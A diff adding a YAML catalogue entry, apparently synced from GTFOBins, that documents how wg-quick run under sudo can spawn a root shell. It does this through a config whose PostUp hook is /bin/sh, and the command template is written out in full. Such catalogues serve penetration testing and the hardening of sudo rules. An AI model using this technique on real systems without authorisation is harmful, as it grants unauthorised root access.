@@ -1,0 +1,34 @@
+id: gtfobins/wg-quick/shell/sudo
+type: binary
+platform: linux
+name: wg-quick
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'cat >/path/to/temp-file.conf <<EOF
+
+    [Interface]
+
+    PostUp = /bin/sh
+
+    EOF
+
+
+    wg-quick up /path/to/temp-file.conf'
+  comment: Use `wg-quick down /path/to/temp-file.conf` in order to be able to run the shell again.
+references:
+- https://gtfobins.github.io/gtfobins/wg-quick/
+tags:
+- linux
+- unix
+- gtfobins
